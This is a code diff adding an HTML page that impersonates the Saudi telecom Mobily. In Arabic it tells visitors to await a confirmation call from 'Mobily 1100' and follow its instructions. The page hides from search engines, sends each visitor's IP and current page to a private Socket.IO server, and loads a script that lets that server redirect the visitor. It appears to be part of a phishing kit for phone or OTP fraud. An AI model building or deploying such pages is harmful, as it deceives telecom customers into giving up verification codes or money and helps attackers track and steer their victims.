@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>Mobily Call</title>
+
+  <!-- ✅ Bootstrap -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
+
+  <!-- ✅ Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap" rel="stylesheet" />
+
+  <!-- ✅ Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+
+  <style>
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    body,
+    html {
+      height: 100%;
+      margin: 0;
+    }
+
+    .center-screen {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    h3 {
+      font-weight: 700;
+    }
+
+    p span {
+      font-size: 22px;
+      font-weight: 700;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="center-screen">
+    <div class="text-center">
+      <img width="50%" src="assets/photos/mobilyCall.png" alt="mobily-call" />
+      <div class="d-flex mt-5 justify-content-center">
+        <div class="spinner-border" role="status"></div>
+      </div>
+      <h4 class="mt-3">بانتظار تأكيد الجوال</h4>
+      <p>
+        سوف تصلك الآن مكالمة من رقم موبايلي 1100 لتأكيد الطلب يرجى اتباع
+        التعليمات الموضحة في المكالمة
+      </p>
+    </div>
+  </div>
+  <!-- 1) Load Socket.IO once -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    window.visitorIP = null;
+    (async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+        window.visitorIP = ip;
+        const page =
+          window.location.pathname.split("/").pop() || "mobilyCall.html";
+        window.socket.emit("updateLocation", { ip, page });
+      } catch (err) {
+        console.error("Failed to fetch visitor IP:", err);
+      }
+    })();
+  </script>
+
+  <!-- 2) location.js to handle navigateTo events -->
+  <script src="./assets/js/location.js"></script>
+</body>
+
+</html>
